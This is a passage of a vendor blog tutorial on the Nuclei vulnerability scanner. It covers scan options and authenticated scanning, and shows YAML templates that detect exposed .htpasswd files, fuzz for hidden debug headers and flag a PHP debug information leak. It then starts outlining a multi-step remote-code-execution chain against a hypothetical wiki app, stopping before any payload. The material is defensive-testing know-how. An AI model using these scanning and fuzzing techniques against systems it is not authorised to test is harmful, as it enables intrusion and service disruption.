{
    "id": "dbpedia_8306_1",
    "rank": 34,
    "data": {
        "url": "https://blog.projectdiscovery.io/ultimate-nuclei-guide/",
        "read_more_link": "",
        "language": "en",
        "title": "The Ultimate Guide to Finding Bugs With Nuclei",
        "top_image": "https://blog.projectdiscovery.io/content/images/2022/10/The-Ultimate-Guide-to.png",
        "meta_img": "https://blog.projectdiscovery.io/content/images/2022/10/The-Ultimate-Guide-to.png",
        "images": [
            "https://blog.projectdiscovery.io/content/images/2024/01/ProjectDiscovery---Logo-mark.svg",
            "https://blog.projectdiscovery.io/content/images/2024/01/ProjectDiscovery---Logo-mark.svg",
            "https://blog.projectdiscovery.io/content/images/2021/01/logo-1.png",
            "https://blog.projectdiscovery.io/content/images/2022/10/The-Ultimate-Guide-to.png 300w,                    /content/images/2022/10/The-Ultimate-Guide-to.png 600w,                    /content/images/2022/10/The-Ultimate-Guide-to.png 1200w",
            "https://lh5.googleusercontent.com/tztF4m3WMQqbf4wmYoKPUapGItvE063p7RRmCe2xZpK1fphiwYwYOwtQUkI5rdRdupsesiZbRHqFaKtbUd2Iyrf55MW3cIA9QKrxHWJS70ailO6t7P-WagA9XRtqk_W8Y5JVRjLdpKHTqQVQOy3PH0j1oQrrCemRSXsq83w6f4d59hjmpi8cLxJVsn8zf1ZpSnQ",
            "https://lh3.googleusercontent.com/sQIGuQSzYgJtQbsKDjbU8n2VNsNdZtCvDllXJs2sM042gFdydsdsPViQOwqWSlRTRKzu1z2BLf4qm0tytj0tTtDKIINXzZWtNiAyoVQ4ruOoG1OmYpvR6WVYm5IvTwaP2a5S3uiOOq7QNbERiQOjEieQGiJye38sSIjQmz1QzhjprkFw4A75SPx5ezG8Ek6S8fo",
            "https://lh6.googleusercontent.com/UaxKj9M08Ffn3c1B3LbBjaBscHqdDvM7EAM-ErNvO3jOogeTfM0gfJrf6oh9k09j1Pv8FjA6ZMVLFayDEfbVzo682dR9VTAnlKVguNCf8_4xG6bbqVaxUpQgNWXsm05riCkaquMTHYERbCvumXfFwxKR2EN9INBtVhh7z2JjL2sayZFFqdVUfjeyu_xOaimwYNU",
            "https://lh6.googleusercontent.com/rRzQ99HZpRIVWamEO73aeElrbMMe9g3G_CbgK4-nBq4QsgE_BIk7JzlADJMuj9tyea9i1dsDm0MS2HAw7bi_krw3Z75JsKhyr5bQS4tJca2vHgiHJjtM6yl1uKoBKiOxuMW0tZRhRgR9GX58MBIHeuJtMpp6uM9v4IjTja6_lMktRhclVjg4v_owNyUTW4Wt44s",
            "https://lh3.googleusercontent.com/63nXQuf91P8RcXme_BWD8bgnzYq8q4uw6t3q0zPfzuxHDd9t2Lsi2ydf5dZbugjOP7bkQQ8gE5Ckeg1uhTwJU3n1YN9549Q149dc4A7mDFmetE9LFcgAqJtfXKp7CKtlcBaYaaQQJHNyW8CfIpOimFK_anT_SvlejcvKYm3_uiwfA-WGc8cdy5CPBNrdsUizdwM",
            "https://lh3.googleusercontent.com/HQE4xlfjnUfWWr0wgGi1BLW_wd2TIkx4D05WHdAp7iyziBLvj54rcXbFtov1WdKBBiynieMIib99Qmyl_uW9Toc3841b9F7oBLi7uOXGiHqu_9ntp87djud1UxRpwEJ4s-GG_4cdj_ssQSxVZtXtF526QpSm5ilIwQHcg1skVRlRT7C4IIbcBKcOcsNuKVgHCwI",
            "https://lh5.googleusercontent.com/StLteyAMOh0K663fE8tpGCqYmFG-13BifJ4N2mFIK-syH1MThrf6zxs8rMW53wzMvyWttbc6wRBbrPi_iIzF7wtJFx_JUN_y6UHmxvWj9MPMEtUKuef3lC7Fs3izPvJvFQ52v21EyZx7DrMvH-wNUPU80wGK8NXYQ31N_V7npDTJrS6tBYQrBJU56KjmPeUP2OA",
            "https://lh4.googleusercontent.com/QUZF-OlbpTLTNBpHKElTdbY2FDl8t7UoP3sVhNBX0isR7cJXR9OBy_hKwCj1yPBYtPoUD_vIWeNu3qO60saU7-YOuZ1XlCK-7PQlrpzLMxrVNjIyxdojkzI3ePSJMY7qFdOXr4eMMwB-ti2hDHjESofkZ76vOtmU8rW-JV4VrNavrxe3Ek3F6WEb4S12XkawMa4",
            "https://lh4.googleusercontent.com/_TyYC3xEpda6-GmuQUV4xwYmBbtiMlJkuMhDNx7WtLKzsl2UY5N-n5fCflUpzDZacucHte9YQYBWa84isKA7_JTyna8JwIvokyDoJ4SWAV2WHs0-Cqb0365nIsp16QgXGEK3o9akieVSl9V4fr0U09H6dI42P8gjUQr4DHouGPE1dPAeF1RuU2Cyp0bg3TiR0ZA",
            "https://lh3.googleusercontent.com/DnmmL9F-9QkLCNU0yx44cZBVj02x-MjemvbNPikis2qmsG8lJBZN5iUdhQZ2-XZPTPrm6or6ljuEvU340ayZHmZvXA19E6uHnVok3sl4oT6rfw30_m9dOifkC4f5I6ZbFmXFWYFukx6aKr6-gH7qRwKWlHd6hYEw3B3_behqq9z_PYOGx0GaYFRxlPJAuElXqcg",
            "https://lh4.googleusercontent.com/ZlyJw6ke_sPtKWImfqnKVK3Rj3VtY78ifVFsx1bt-Mig8lx1bE1QYhZb3z60CnF-ISEScs_F4L1q_dqnadd6cc7AtG9bfB1D2PSFMrtoJvURVgsCqy48Tfio0L_OOmloEG3wobpYhRxZqUCApeRGuRxDt6tWvjHtsby_oxZb8xSYishM0IRchwko7R_-OoaL5mM",
            "https://lh3.googleusercontent.com/SDQANg8eWEgEeF2cEHGt_H4DrJiNeG_UUInaECjjsTBEeg38ocLALmXJsDq6eJfYvDrCI_QrL-CDxLEJ6QN1TD8Rwm4USt-3Z7yYzc_mFYZaeg5MV0HnxpNUw-SVnplNLCnM21G0VqsN1O5TaSwlNMseuOpNVWSkznXhN8X_21eaZi7ab12yymGGrDY-HDaNkkw",
            "https://lh4.googleusercontent.com/9fOB7uypL-5-kE6dFHwsRbTwdGpOg_VJHBEBdrnTA5zNhA618eUNMdMfIIY_QhwMRSfQ-sQLXfFoIhP0ZF8Rt7cbsuhZxPOS5LSTsJe3oro6D8xPHJF-BzSogZiHpfJBLT-Hn1_9U5_7pLSocRvl7d5l0WYfT1GCUZeWz7rX45EVRGHXG5Cq5Opd-NEcwhBKi7U",
            "https://lh6.googleusercontent.com/tcosOR0-YVyXFK0fO1YzpL2OjqcdiVEP7J8VT8YR_0VDeJqqWWH8NaJ1Lmv8FvFsrWXWFNJVcKyYE7glzDnBGcwmPsO2LNrBqImr77VW63yCjFdhzSfTvxpFmkqwcMdXag-w9aDbYi9MdDz--stcVTQK5p03co1mS-n1d0YrFOm9p4rVrgR9mfrC1wZMVXePGBM",
            "https://lh5.googleusercontent.com/KqCa3Wj2P0q3b8UIHl4NFDnMhDSzoi3jL-aIAjdNTJQbugKA04-6NxAJcYVGiKOW65pG8meby7FNlheukKPFGn6KLJx282sjuXTsPRy1XCo04c7aq-d-7DW92pzMbsnG_7HuDTmI_KHue1QRe0txPqHBzih4J2E1gnEaOHc3gHnq3z1oAwBTkivAO75HI6UZKSs",
            "https://lh5.googleusercontent.com/8QCJoinWcxoN7mObGE9rWmR3xHN_1v2U7ocvLkWf-Lkd6AljUt8of-g-tjwctgffFzXpFU7Wbz9B5GmBK0kBut-UiAXQJy0DTmwiOnA71FDDzpHmeeKEI2xI-6ttDcpoCclGIwcnGanP_GHXpuhhRknhGy6dBOqEMBxVPwXOINN5ZhVUCsk8jFHs9ZAGWeBq3lA",
            "https://lh4.googleusercontent.com/bgVSy6owHcUwiv3PHzO7d6A1B5O_UGQvsQxgt3ffvbeQ_ZVG1dSk3VGqFMVOPcp1rCdeCPKeG7WSandm4vBAZyRs6hbx1Comf-AY_wmPN70jS9jirkVviSrBb6ks7rPLkm1nigK-Q5psv23Y4Yi5ZPsh-z1dC3pj9FKbGHdNfpRsXH9rOHSutoGmqVSP_z_-mPU",
            "https://lh4.googleusercontent.com/2AGfergRjhoUiQjYCgrx81faCA0EdBkKVriDpWvBbWykCBEDaZ9KFCKIuBFxID7VW1Hg7ShqXosyM46ttOjy7t0sCMQWGOXi-CSVjOQZHEnpJHsdiI4zTRHvxkIZIFCZ-nJdLnV7DLgwjk1hFztX9M6RQOZsMwOvpLZh8UM6QLnMwed3WoIfIfhuwzLy35AT4R0",
            "https://lh4.googleusercontent.com/94MbpYrvKgeb5ZXTf5zBEjDphp4bbiFySdW2x9ouClqskhKdnqOLzxj5RMLo22bnTHDcZIKz0ZkybwozL5DuL6R5Mm-ffVLbkX9K4tPm98na4xfIkFOwBlBcIRWRaJn4DRPSnUSDU0CDpwjXkfpH-zQdn0SZOzFRVXeWAyCYHgECNuK8YCz7MWO8",
            "https://lh4.googleusercontent.com/eedEEkDU0wVy_Gby_EDlKdqI0Ol8KYcA0x9ES2Iachy9rlFw9G_ihgytQL-XIL13JQt8I8Ofsn4wFaa03wsuUGMx1LW_CPBpUeSpYX2TmZr7GvebLw3OWqi7O6JdGh1nynfIxRdzeC6-CQdwq6VVYvGKR6jbm47IMQtKMd-6sDS-WIafG2lV-DbQoq_25EhoEms",
            "https://lh5.googleusercontent.com/PtrBlCIHvPKhTXpowQDvOsHsGlIycHOny3Ew6Vh2DO-7rsdFL3WRY3S9uNIJGNMWxqN9yt00nNr8F4KpHBFTj4-0p9IOyRpcvuL7hFAs7hwOqmKfwTO30upk8pLKD5cqJeHrnXhiCP7u6fE66LYoretzD75G6FzMx8v8i171gUVVHneQJ4kVN2ZUETKcO5YSljk",
            "https://lh5.googleusercontent.com/G_i9oT5fyVVBzZI8rZlDrRFcy-itOm-H16lZKfgOHRrrL4V7k1rJXFlRqShRleOWv6CvL8v3OhaufW_-KgAHK6FvV_-WCKeCW4KloZMc5RbG2E-WIHRzGmz-4_dmorM-K-rqG633g3hCDPwXnOnOWaFSOraMEowM4cYsBNhVwsl1Pvfyg5Wiy0mMovSeqBga7ag",
            "https://lh5.googleusercontent.com/nGMASAaM3gpydfZpImatWDNrBeLM6_mai3unJGq0mYLHcHle1LYprwYeeclmqaaPquTFaJk8TYVjxUbDq7f84I-9UD_giecAdF5PuUCbldnz5jLoI4J4b7kKW12a2ba8vS0uMnB3sgTznwwOJscS0VR8rrGvSOksz6b8IVQnZJR6hKnJAUpHY1-sC9w6488ye8o",
            "https://blog.projectdiscovery.io/content/images/2022/10/Building-a-Fast-One-Shot-.png",
            "https://blog.projectdiscovery.io/content/images/2022/09/ASNMap-A-Golang-CLI-tool-for-speedy-reconnaissance-using-ASN-data.png",
            "https://blog.projectdiscovery.io/content/images/2024/01/ProjectDiscovery---Logo-mark.svg",
            "https://blog.projectdiscovery.io/content/images/2024/01/ProjectDiscovery---Logo-mark.svg"
        ],
        "movies": [],
        "keywords": [],
        "meta_keywords": [
            ""
        ],
        "tags": null,
        "authors": [
            "ProjectDiscovery"
        ],
        "publish_date": "2022-10-12T14:59:45+00:00",
        "summary": "",
        "meta_description": "Efficient, extensible, flexible, open source vulnerability scanning.\n\n\nIntroduction\n\nNuclei is a fast, efficient, and extensible vulnerability scanner. It can scan thousands of hosts in just a few minutes.\n\nThe Nuclei engine uses YAML-based templates to define the steps required to detect a vulnerability.\n\nAs an open-source tool we encourage community",
        "meta_lang": "en",
        "meta_favicon": "https://blog.projectdiscovery.io/content/images/size/w256h256/2024/01/ProjectDiscovery---Logo-mark.png",
        "meta_site_name": "ProjectDiscovery Blog",
        "canonical_link": "https://blog.projectdiscovery.io/ultimate-nuclei-guide/",
        "text": "Efficient, extensible, flexible, open source vulnerability scanning.\n\nIntroduction\n\nNuclei is a fast, efficient, and extensible vulnerability scanner. It can scan thousands of hosts in just a few minutes.\n\nThe Nuclei engine uses YAML-based templates to define the steps required to detect a vulnerability.\n\nAs an open-source tool we encourage community contributions to the library of templates, and development of the codebase. This means whenever a new CVE is published, someone can create a Nuclei template and can publish it for the security community to use.\n\nThis blog explores many of Nuclei‚Äôs various features and options including powerful capabilities like custom templates and workflows. We also provide some guidance on how to use these features to find bugs in real targets.\n\nContents\n\nThere is a lot to cover here, so we're including some links to make it easier to navigate to the topics you're the most interested to read. We're also hoping you've bookmarked this post to refer to and find the information here useful enough to revisit üòâ.\n\nTemplates\n\nEasy Mode\n\nFiltering Templates\n\nRate Limiting\n\nOptimizations\n\nResuming Scans\n\nCustom Headers and Template Variables\n\nCustom Templates\n\nSimple Vulnerability Detection\n\nDebugging\n\nAdvanced Features\n\nAdvanced Fuzzing\n\nUpdates\n\nProjectDiscovery Cloud Platform\n\nAdditional Resources\n\nTemplates\n\nA Nuclei template is a YAML file. The markup data in the file tells Nuclei what to send to a host and what to look for in the host‚Äôs response to determine whether it is vulnerable to a certain issue.\n\nNuclei can understand various network protocols and services including HTTP, DNS, SSL, and raw TCP communications. We‚Äôll cover templates for HTTP scanning in detail first, as web services are the most common target for the typical Nuclei user, and later we‚Äôll take a look at how to develop custom templates for scanning some other protocols.\n\nIn summary, a Nuclei HTTP scanning template will specify the details of the request, such as the request method, the path and headers; and rules for how to check the response to fingerprint the service or determine the presence of a vulnerability.\n\nThe Nuclei engine uses ‚Äútemplate clustering‚Äù to optimize the number of requests sent to a target and reduce network traffic. A basic example of how this works is if a scan contains 5 individual templates that need to make a GET request to the path /login.php, then instead of making 5 separate GET requests to that URL, it will make one request and the 5 individual templates can process the results of that request.\n\nEasy Mode\n\nNuclei is simple to get up-and-running without having to read a lot of documentation. After installing the tool, it can be as simple as running (for a single target):\n\nnuclei -u https://my.target.site\n\nor to scan non-HTTP(S) network services:\n\nnuclei -u my.target.site:5759\n\nor for multiple targets:\n\nnuclei -l /path/to/list-of-targets.txt\n\nThese commands will use Nuclei to scan for thousands of known vulnerabilities and enumerate information about the target(s).\n\nNuclei will select options to run the vulnerability scan and display the results. By default, it runs nearly all the community-developed templates that are relevant for the chosen service(s) against the specified target(s). A few templates are disabled due to the risk of denial-of-service or because they are designed for fuzzing. They can however, be explicitly selected by using the template filtering options described a bit further down.\n\nNuclei is designed to be integrated into an overall security assessment workflow that consists of multiple tools, for example, you could run a subdomain enumeration, check for HTTP services, and pipe the results into Nuclei to scan each of those hosts for vulnerabilities.\n\nsubfinder -d targetdomain.com -silent | httpx | nuclei -t technologies/tech-detect.yaml\n\nTake a look at the documentation around many of the other tools that are offered by ProjectDiscovery.\n\nFiltering Templates\n\nAt the time of writing, there are nearly 4000 community-developed Nuclei templates in the library. The range of templates include detections for known CVEs, common misconfigurations, exposed sensitive files, tech stack fingerprinting and so on.\n\nNuclei provides some options for more intelligent and efficient scanning of targets instead of the default ‚Äúshotgun‚Äù approach of using every template in the library against the specified hosts. We can selectively filter templates based on a few different criteria. Let‚Äôs look at these options.\n\nAutomatic Selection (-as)\n\nThis option attempts to fingerprint the technology stack and components used on the target, then select templates that have been tagged with those tech stack keywords. Example:\n\nnuclei -u https:// my.target.site -as\n\nOnly New Templates (-nt)\n\nThis option will use only templates that were added from the last update (for example by running nuclei -update-templates). Example:\n\nnuclei -u https://my.target.site -nt\n\nSpecific Templates By Filename (-t )\n\nThis option will run specific individual templates. Instead of a single filename, a file containing a list of template filenames (one per line) can be supplied as the argument. Multiple -t arguments can be provided.\n\nExample:\n\nnuclei -u https://my.target.site -t file/logs/python-app-sql-exceptions.yaml -t exposures/files/pyproject-disclosure.yaml\n\nuser@kali:~/nuclei-templates$ cat templates-35.txt file/logs/python-app-sql-exceptions.yaml exposures/files/pyproject-disclosure.yaml\n\nuser@kali:~/nuclei-templates$ nuclei -u https://my.target.site -t templates-35.txt\n\nSpecific Templates By Folder (-t)\n\nThis option will run all templates within a specific subfolder located under your nuclei-templates folder. Instead of a subfolder, a file containing a list of folders (one per line) can be supplied as the argument. Multiple -t arguments can be provided. Example:\n\nnuclei -u https://my.target.site -t file/logs -t exposures/files -t cves/2021\n\nuser@kali:~/nuclei-templates$ cat template-categories.txt file/logs exposures/files cves/2021\n\nuser@kali:~/nuclei-templates$ nuclei -u https://my.target.site -t template-categories.txt\n\nSelect Templates By Tag (-tags)\n\nThis option will use only templates that have been tagged with the specified value. Templates may be tagged by technology stack or the application or service they are applicable to. Example:\n\nnuclei -u https://jira.targetdomain.site -tags jira,generic\n\nSelect Templates By Severity (-s)\n\nThis option will use only templates that have the specified severity in their metadata. Example:\n\nnuclei -u https://jira.targetdomain.site -s critical,high,medium,low,info\n\nRate Limiting\n\nNuclei features a number of options to limit the rate the scanning engine sends requests to the target. These options prevent disrupting the availability of a target or where there are bandwidth issues between our host and the target. These options allow restricting the number of requests being sent (150 per second by default) and how many concurrent templates are executed (25 by default). Example (restrict outgoing requests to 3 per second and only 2 concurrent templates):\n\nnuclei -u https://my.target.site/ -rl 3 -c 2\n\nRate limiting can also be specified in terms of requests per minute with the -rlm <int> option.\n\nOptimizations\n\nA number of other Nuclei options can be tweaked to assist to reduce the time to complete a scan, or to allow for an unreliable network connection.\n\nTimeout Length (-timeout)\n\nWe can set the amount of time before a connection attempt times-out using this option. The default value is 5 seconds, however we may want to reduce the time to complete the scan more quickly if we are scanning many hosts. Example:\n\nnuclei -l list-of-targets.txt -timeout 1\n\nNumber of Retries (-retries)\n\nBy default, Nuclei won‚Äôt retry a failed connection attempt. Using the retry option, we can set the number of retries. Example:\n\nnuclei -l list-of-targets.txt -retries 3\n\nNumber of Errors (-mhe)\n\nThe default setting for nuclei to abandon scanning a host due to errors is 30. We can increase or decrease this number using the max errors option. Example:\n\nnuclei -l list-of-targets.txt -mhe 3\n\nResuming Scans\n\nNuclei provides the ability to resume a stopped scan so you don‚Äôt have to start all over again if you interrupt it for some reason. After hitting control+C to exit a running scan, the tool will create a resume file and print the path in the console output:\n\nYou can resume the scan from the last request with a command similar to the following:\n\nnuclei -l targets-file.txt -resume /path/to/resume-file.cfg\n\nCustom Headers And Template Variables\n\nSo far, the scanning we have demonstrated has been unauthenticated. Sometimes you might need to conduct a vulnerability scan on a service that requires credentials, for example via HTTP basic authentication or a client certificate. Authentication information and other parameters may need to be passed to templates.\n\nNuclei‚Äôs configuration options allow variables and custom headers to be supplied to templates in various ways.\n\nCookies or Request Header (-H)\n\nIf the target‚Äôs authentication must be sent in a cookie or HTTP request header, the -H option can be used, with the header specified as a colon-separated ‚Äúheader_name:header_value‚Äù pair like the following example:\n\nnuclei -u https://api.target.site -tags php,apache -H ‚ÄúCookie:sc_=BPGFJcNgMwfePZBeJqoC838j8Mv4‚Äù\n\nTemplate Variables (-V)\n\nA template may require variables to be passed to it containing authentication information. To pass key/value pairs to a template, use the -V option like the following example:\n\nEnvironment Variables (-ev)\n\nA template may require environment variables to be passed to it containing authentication information. To pass environment variables to a template, use the -ev option like the following example:\n\nTemplates that accept environment variables may look something like this:\n\nrequests: - method: POST path: - \"{{BaseURL}}/apps\" body: username={{N_USER}}&password={{N_PASS}}\n\nNuclei will pass environment variables to a template if the -ev option is set:\n\nClient Certificate Authentication (-cc)\n\nSome services on scanned hosts may require a client certificate for authentication. The certificate should be in PEM-encoded format and can be supplied using the -cc option. For example:\n\nnuclei -u https://api.target.site -cc /path/to/client-cert.pem\n\nOther options that relate to client certificate authentication are the -ck and -ca switches that allow you to provide PEM-encoded private key and Certificate Authority (CA) files to be used in authentication to hosts.\n\nLimitations of Easy Mode\n\nThe default ‚Äúout-of-the-box‚Äù mode of Nuclei is akin to pushing the ‚Äúhack button‚Äù while you sit back and let the tool scan your targets on autopilot. If you are a bug bounty hunter however, this may not be so great for your results. Many people run Nuclei on its default settings, making it highly likely that you'll just get the same findings as everyone else that has run it against the targets you‚Äôve selected.\n\nTo unleash Nuclei's true potential, we need to use custom templates and workflows. How do we do that? Read on to find out!\n\nThe next powerful feature of Nuclei we‚Äôll look at is custom templates, which instruct Nuclei on how to actually find vulnerabilities.\n\nCustom Templates\n\nAlthough there are thousands of community-developed templates available, anyone who wants to be a Nuclei power-user should learn how to write custom templates. Here are some scenarios where you might want to develop a custom template:\n\nA new CVE has been discovered, you‚Äôve read the write-up, which demonstrates a simple Proof-of-Concept and no one has written a Nuclei template yet\n\nYou find an 0-day vulnerability yourself and want to allow others to scan hosts for the presence of the issue\n\nYou discover a novel attack vector and payload that works on one target (for example, due to a coding pattern in a library or component of that framework) and you want to investigate whether the same issue affects different libraries and applications that might use a similar pattern)\n\nIn the next few sections we‚Äôll dive into how to write templates and use the various template engine features.\n\nIn addition to Nuclei, ProjectDiscovery is also working on the release of ProjectDiscovery Cloud Platform, which includes advanced support for custom templates, including a template editor that provides a cloud-hosted tool with tons of helpful features to create, test, and share custom templates.\n\nThe Basics Of Writing Custom Templates\n\nTemplates need to contain some essential information that can be summarized as:\n\nTemplate id\n\nTemplate info\n\nWhat data to send to the remote host\n\nInstructions on how to analyze the response\n\nLet‚Äôs look at a full example of a simple template that contains all this information:\n\nid: htpasswd info: name: Detect exposed .htpasswd files author: geeknik severity: info tags: config,exposure requests: - method: GET path: - \"{{BaseURL}}/.htpasswd\" matchers-condition: and matchers: - type: word words: - \":{SHA}\" - \":$apr1$\" - \":$2y$\" condition: or - type: status status: - 200\n\nWe‚Äôll look at the various parts of a template definition in detail, but for now, just know that the purpose of templates is basically to tell nuclei what requests to send, and what to look for in the response.\n\nAn example we can use to illustrate the basic components of a template is a simple web-fuzzer.\n\nFuzzing\n\nFuzzing is a testing technique that involves sending unexpected, random or deliberately malformed data to a software application. This technique is an integral part of security testing that uses a ‚Äúblack-box‚Äù approach, i.e. where the internal details of an application are unknown.\n\nNuclei templates provide the ability to automate fuzzing. Basically, we create a template to define the base request, the points where to inject the fuzz payload(s) and how to check the response for indications of a possible vulnerability.\n\nSimple Vulnerability Detection\n\nLet‚Äôs imagine that you saw an interesting research post about ‚Äúx-debug‚Äù HTTP request headers and this got you thinking about whether there are some similar interesting undocumented headers lurking in applications and frameworks out there on the internet.\n\nYou could use Nuclei to do some fuzzing of web services, by fuzzing request headers using a wordlist containing numerous payloads and analyzing the responses to detect anomalies.\n\nAfter we add some mandatory template information, it starts off like this:\n\nid: my-test-nuclei-template info: name: X Debug header fuzzing author: me severity: info description: Discover x-*-debug request headers # TODO: what data to send to the remote host # TODO: instructions on how to analyze the response\n\nWe need to add some more data to the template to tell Nuclei what to send and how to analyze it. In a template that is designed to scan HTTP services, we use the ‚Äúrequests‚Äù field to instruct Nuclei on what to send to the target.\n\nRequests\n\nThe ‚Äúrequests‚Äù field tells Nuclei what type of HTTP request to send to the remote host. The template engine allows common HTTP methods such as GET, POST, PUT, etc. to be specified, and also permits a ‚Äúraw‚Äù mode where we have full control over the various parts of a request. We‚Äôll get into the finer details of raw mode a bit later, but it provides the ability to use some of the more advanced features of Nuclei templates. For our fuzzing example, we‚Äôll use raw mode.\n\nThe requests field is an array structure, so multiple requests can be sent if required, however we only need to send a single request in this example. Our template needs the following added to it:\n\nrequests: - raw: - | GET / HTTP/1.1 Host: {{Hostname}} X-{{fuzz}}-debug: 1 redirects: true attack: batteringram payloads: fuzz: /var/tmp/fuzz.txt\n\nThe template engine uses double-mustache expressions like {{some_expression}} to define dynamic parts of the request. It makes several URL-related variables available globally such as {{Hostname}}, {{Scheme}}, {{BaseURL}} and so on. The full list can be found in the official templating guide.\n\nWe‚Äôve defined our fuzzing injection point using {{fuzz}}. You could use whatever permitted variable name you want instead of ‚Äúfuzz‚Äù. The actual list of payloads that will replace {{fuzz}} in the requests, are read from the file /var/tmp/fuzz.txt, which should contain one payload per line.\n\nWe could also include a list of payloads inline (if the list isn‚Äôt huge) in the template by using something like:\n\npayloads: fuzz: - abc - def - test - xyz - php - derp\n\nThe ‚Äúattack‚Äù field tells Nuclei what fuzzing mode to use. The available options are batteringram (default), pitchfork and clusterbomb. Batteringram is the only one that makes sense here because there is only one injection point. If there are multiple payload injection points in the request, the other modes can be used.\n\nA summary of the attack modes is as follows:\n\nFull details of the attack modes can be found in the HTTP fuzzing section of the official templating guide.\n\nLastly, the redirect field tells Nuclei to follow any HTTP redirects.\n\nMatchers\n\nWe‚Äôve told Nuclei how to send a request to the target, now we need to tell it how to analyze the HTTP response returned by the host for the presence of a vulnerability or anomaly in application behavior. To do this we need to associate a matcher with the request. A matcher is a feature that can use several techniques to inspect the host‚Äôs response and compare elements of it to values we define.\n\nIn this example application, we can derive some information about an expected response by inspecting an baseline request to the application:\n\nFrom the request/response shown in the screenshot above, we know from the response‚Äôs Content-Length header, that the expected response from the application contains a body of size 109 bytes.\n\nWe write the matcher rule to flag a response if we receive a response body larger than 109 bytes.\n\nFor our template we‚Äôll use a DSL (Domain Specific Language) matcher, which allows us to use Nuclei‚Äôs expression language to check things like the response body length:\n\nstop-at-first-match: false matchers: - type: dsl dsl: - \"len(body) > 109\"\n\nThe template language above tells Nuclei to continue even if we get a response that matches by using the ‚Äústop-at-first-match‚Äù option. The matchers field is an array structure, to allow multiple matchers. In this case we just use one of the ‚Äúdsl‚Äù type. The expression will flag any response where the body size is greater than 109 bytes.\n\nThe final template will look like this:\n\nid: my-test-nuclei-template info: name: X Debug header fuzzing author: me severity: info description: Discover x-*-debug request headers requests: - raw: - | GET / HTTP/1.1 Host: {{Hostname}} x-{{fuzz}}-debug: 1 payloads: fuzz: /var/tmp/fuzz.txt attack: batteringram redirects: true stop-at-first-match: false matchers: - type: dsl dsl: - \"len(body) > 109\"\n\nSo now we can run our custom template against our target, using our fuzz payload list.\n\nThe scan has detected that a payload of ‚Äúphp‚Äù produced a response that was flagged by the matcher. This means a header value of ‚Äúx-php-debug: 1‚Äù caused the host to return an anomalous response (longer than 109 bytes). We can send a request containing this header manually to the host again and inspect the actual response to see what was returned, and note that the response was flagged because the content-length was 3023 bytes:\n\nWe can see that we have indeed discovered a non-standard HTTP header that looks like it has caused the application to disclose some interesting information.\n\nNow we will probably want to write another template to detect applications that understand this specific ‚Äúx-php-debug‚Äù header on other targets and share it with others.\n\nLet‚Äôs create and examine another simple custom template to demonstrate a few more request and matcher options. The full template is shown below:\n\nid: x-php-debug info: name: x-php-debug header info disclosure author: me severity: medium description: Detect x-php-debug request header information leak vulnerability requests: - method: GET path: - \"{{BaseURL}}\" headers: x-php-debug: 1 redirects: true max-redirects: 3 matchers: - type: word words: - \"Array\" - \"[HTTP_AUTHORIZATION]\"\n\nThis time, we have just used a basic HTTP GET request instead of raw mode. There were several attributes we specified for the request data including, HTTP method, the path and any request headers. In this case, we added our ‚Äúx-php-debug‚Äù header in the ‚Äúheaders‚Äù field.\n\nFor the matcher type, this time we used a ‚Äúword‚Äù matcher, which simply scans the response for the presence of the provided string values (words) ‚ÄúArray‚Äù and ‚Äú[HTTP_AUTHORIZATION]‚Äù, which we expect to be present in the response if it leaks PHP environment information.\n\nTesting our template against a target, we can see that it works, detecting the information disclosure vulnerability:\n\nSo far, these have been fairly simple template examples, however as an inexperienced template creator, we might make some mistakes in the template syntax or structure as we are learning to develop them. To help troubleshoot any mistakes, we can use Nuclei‚Äôs debugging features which we‚Äôll look at next.\n\nDebugging\n\nA useful set of Nuclei features for developing custom templates is the debugging options. These options allow us to troubleshoot the behavior of the template in case it is not producing the expected results or resulting in an error.\n\nValidate (-validate)\n\nThe validate option will load the template and validate whether the syntax is correct, displaying any issues that are detected. It‚Äôs a good idea to run this validation on a template we‚Äôve created to quickly detect any syntax errors. To demonstrate, let‚Äôs change the HTTP fuzzing template we created earlier to introduce an intentional typo on line 24, instead of ‚Äúdsl‚Äù we substitute ‚Äúds‚Äù, which is a non-existent keyword:\n\nNuclei‚Äôs template validation will flag the error, specifying line 24 as the error location:\n\nOnce we‚Äôve fixed the syntax errors and run the validation again, Nuclei should inform us that the validation was successful:\n\nVerbose Output (-verbose | -v)\n\nThis option will print any verbose output that templates may generate in addition to their normal output. An example is:\n\nnuclei -l targets.txt -t my-template.yaml -v\n\nDebug (-debug)\n\nIf even more detail is required than the verbose option provides, the -debug switch will print all requests and responses the template makes. This is handy for analysing any variable or helper function use, the sequence of requests and whether matchers are working correctly. An example is:\n\nnuclei -l targets.txt -t my-template.yaml -debug\n\nProxy (-p)\n\nIf you prefer to inspect the requests and responses associated with a template using a tool like BurpSuite or OWASP Zap instead of reading console output, you can proxy them using the -p option to specify the proxy listener URI. An example, where Zap is listening on localhost port 8080 and we want to proxy requests and response through it is:\n\nnuclei -l targets.txt -t my-template.yaml -p http://127.0.0.1:8080\n\nAdvanced Features\n\nThe example templates we‚Äôve created so far have only used a single request and analysis of the corresponding response from the host. Some vulnerabilities require several steps that, for example, might involve extracting a token from one page, then using that token in a request to another page.\n\nTo demonstrate some more of Nuclei‚Äôs advanced template features, we‚Äôll walk through a hypothetical web application that is vulnerable to a remote code execution flaw but requires a valid authenticated session and CSRF tokens to be sent with requests. Exploitation of the vulnerability requires multiple steps:\n\nLoad the login page and check the application is MM Wiki (GET /)\n\nSelf-register a new account (POST /register.php)\n\nLogin with the created account credentials and create an authenticated session (POST /login.php)\n\nLoad the database backup form and extract the CSRF token (GET /backup_db.php)\n\nSubmit a request to create a database backup including the exploit payload and CSRF token (POST /backup_db.php)\n\nTo generate this chain of requests, we will need to discuss DSL matchers and helper functions in more detail, plus examine some additional template features including extractors, request conditions and cookie-reuse. It is important to note that these features are only supported in the raw request mode and not other HTTP modes.\n\nDSL And Helper Functions For Matchers\n\nTo implement step 1 of our request chain, we need to tell Nuclei how to request the root page and detect an appropriate fingerprint to identify it as MM Wiki.\n\nThe root page looks like the following:\n\nIf we inspect the HTML response for the MM Wiki root page, we can see a version string that could be used to fingerprint the application. It‚Äôs the comment string ‚Äú<!-- MM Wiki Version x.x.x‚Äì>\":\n\nWe‚Äôll use a matcher of the DSL type to fingerprint the MM Wiki application. The DSL matcher allows us to use helper functions. Our template starts out with the following data:\n\nrequests: - raw: - | GET {{Path}} HTTP/1.1 Host: {{Hostname}} matchers: - type: dsl dsl: - \"contains(body,'MM Wiki Version')\"\n\nThe ‚Äúcontains()‚Äù function in the matcher is a helper function. We could have also used a simple ‚Äúword‚Äù matcher instead of DSL, however we‚Äôll use DSL 